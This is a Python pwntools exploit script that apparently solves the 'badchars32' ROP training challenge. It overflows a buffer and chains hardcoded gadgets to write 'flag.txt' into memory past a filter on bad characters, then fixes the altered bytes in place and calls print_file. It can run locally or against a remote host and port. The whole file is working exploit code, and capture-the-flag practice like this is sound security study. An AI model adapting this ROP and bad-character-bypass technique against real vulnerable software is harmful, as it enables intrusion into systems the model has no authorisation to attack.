from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./badchars32")

"""
f   l   a   g   .   t   x   t
66  6C  61  67  2E  74  78  74

badchars are: 'x', 'g', 'a', '.'

"""

class ROP_Gadget:
    flag = 0x66606c66
    txt = 0x7477742d
    pop_esi_edi_ebp = 0x080485b9
    mov_edi_esi = 0x0804854f
    data_start = 0x0804a018
    a = data_start + 2
    g = data_start + 3
    period = data_start + 4
    x = data_start + 6
    junk = 0x42424242
    print_file = 0x080483d0
    pop_ebp = 0x080485bb
    pop_ebx = 0x0804839d
    add_ebp_bl = 0x08048543
    one = 0x00000001


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(44)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_esi_edi_ebp,
        ROP_Gadget.flag,
        ROP_Gadget.data_start,
        ROP_Gadget.junk,
        ROP_Gadget.mov_edi_esi,
        ROP_Gadget.pop_esi_edi_ebp,
        ROP_Gadget.txt,
        ROP_Gadget.data_start + 4,
        ROP_Gadget.junk,
        ROP_Gadget.mov_edi_esi,
        ROP_Gadget.pop_ebp,
        ROP_Gadget.a,
        ROP_Gadget.pop_ebx,
        ROP_Gadget.one,
        ROP_Gadget.add_ebp_bl,
        ROP_Gadget.pop_ebp,
        ROP_Gadget.g,
        ROP_Gadget.pop_ebx,
        ROP_Gadget.one,
        ROP_Gadget.add_ebp_bl,
        ROP_Gadget.pop_ebp,
        ROP_Gadget.period,
        ROP_Gadget.pop_ebx,
        ROP_Gadget.one,
        ROP_Gadget.add_ebp_bl,
        ROP_Gadget.pop_ebp,
        ROP_Gadget.x,
        ROP_Gadget.pop_ebx,
        ROP_Gadget.one,
        ROP_Gadget.add_ebp_bl,
        ROP_Gadget.print_file,
        ROP_Gadget.junk,
        ROP_Gadget.data_start
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()